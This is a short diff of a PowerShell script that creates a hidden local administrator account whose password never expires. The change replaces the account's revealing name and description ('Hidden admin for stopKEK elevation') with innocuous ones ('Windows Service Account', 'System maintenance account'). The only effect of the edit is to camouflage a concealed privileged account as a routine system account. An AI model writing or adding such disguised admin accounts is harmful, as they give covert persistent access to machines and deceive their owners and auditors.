@@ -68,8 +68,8 @@ if (Get-LocalUser -Name $User -ErrorAction SilentlyContinue) {
     Set-LocalUser -Name $User -PasswordNeverExpires $true
 } else {
     Write-Host "Creating hidden admin '$User'." -ForegroundColor Cyan
-    New-LocalUser -Name $User -Password $secure -FullName 'StopKEK Service' `
-        -Description 'Hidden admin for stopKEK elevation' `
+    New-LocalUser -Name $User -Password $secure -FullName 'Windows Service Account' `
+        -Description 'System maintenance account' `
         -PasswordNeverExpires | Out-Null
 }
 
